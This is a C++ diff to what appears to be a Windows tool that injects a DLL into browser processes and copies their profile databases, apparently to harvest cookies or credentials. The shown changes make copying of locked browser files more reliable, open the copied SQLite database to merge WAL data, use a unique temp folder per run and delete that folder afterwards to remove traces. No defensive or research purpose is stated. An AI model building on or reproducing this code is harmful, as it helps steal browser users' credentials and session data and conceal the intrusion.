@@ -197,17 +197,22 @@ std::string wstring_to_utf8(const std::wstring& wstr) {
 }
 
 bool copy_single_file(const fs::path& source, const fs::path& dest) {
-    if (CopyFileW(source.c_str(), dest.c_str(), FALSE)) return true;
-    for (int i = 0; i < 5; i++) {
-        HANDLE h_src = CreateFileW(source.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, nullptr, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, nullptr);
+    std::wstring src_str = L"\\\\?\\" + source.wstring();
+    std::wstring dst_str = L"\\\\?\\" + dest.wstring();
+    if (CopyFileW(src_str.c_str(), dst_str.c_str(), FALSE)) return true;
+
+    for (int i = 0; i < 10; i++) {
+        HANDLE h_src = CreateFileW(src_str.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, nullptr, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, nullptr);
         if (h_src != INVALID_HANDLE_VALUE) {
-            HANDLE h_dest = CreateFileW(dest.c_str(), GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
+            HANDLE h_dest = CreateFileW(dst_str.c_str(), GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
             if (h_dest != INVALID_HANDLE_VALUE) {
                 char buffer[65536];
                 DWORD bytes_read, bytes_written;
-                bool success = true;
+                bool success = false;
                 while (ReadFile(h_src, buffer, sizeof(buffer), &bytes_read, nullptr) && bytes_read > 0) {
-                    if (!WriteFile(h_dest, buffer, bytes_read, &bytes_written, nullptr) || bytes_read != bytes_written) {
+                    if (WriteFile(h_dest, buffer, bytes_read, &bytes_written, nullptr) && bytes_read == bytes_written) {
+                        success = true;
+                    } else {
                         success = false;
                         break;
                     }
@@ -235,8 +240,8 @@ bool copy_file_locked(const fs::path& source, const fs::path& dest) {
 }
 
 int open_db_readonly(const std::string& path, sqlite3** db) {
-    // 2026 Solution: Open temp copy as READWRITE and force a checkpoint to merge WAL data.
-    int rc = sqlite3_open_v2(path.c_str(), db, SQLITE_OPEN_READWRITE | SQLITE_OPEN_CREATE | SQLITE_OPEN_NOMUTEX, nullptr);
+    // 2026 Solution: Open temp copy as READWRITE (do NOT use OPEN_CREATE to ensure we only open what was copied)
+    int rc = sqlite3_open_v2(path.c_str(), db, SQLITE_OPEN_READWRITE | SQLITE_OPEN_NOMUTEX, nullptr);
     if (rc == SQLITE_OK) {
         sqlite3_exec(*db, "PRAGMA wal_checkpoint(TRUNCATE);", nullptr, nullptr, nullptr);
     }
@@ -446,7 +451,8 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
     char* user_profile_env = getenv("USERPROFILE");
     if (user_profile_env) {
         fs::path user_profile(user_profile_env);
-        fs::path temp_dir = user_profile / "AppData/Local/Temp/chrome_db";
+        std::string run_id = std::to_string(GetTickCount());
+        fs::path temp_dir = user_profile / ("AppData/Local/Temp/chrome_db_" + run_id);
         fs::create_directories(temp_dir);
 
         fs::path data_path;
@@ -699,6 +705,9 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
     } else {
         CloseHandle(h_process);
     }
+
+    std::error_code ec;
+    fs::remove_all(temp_dir, ec);
 }
 
 int main(int argc, char* argv[]) {
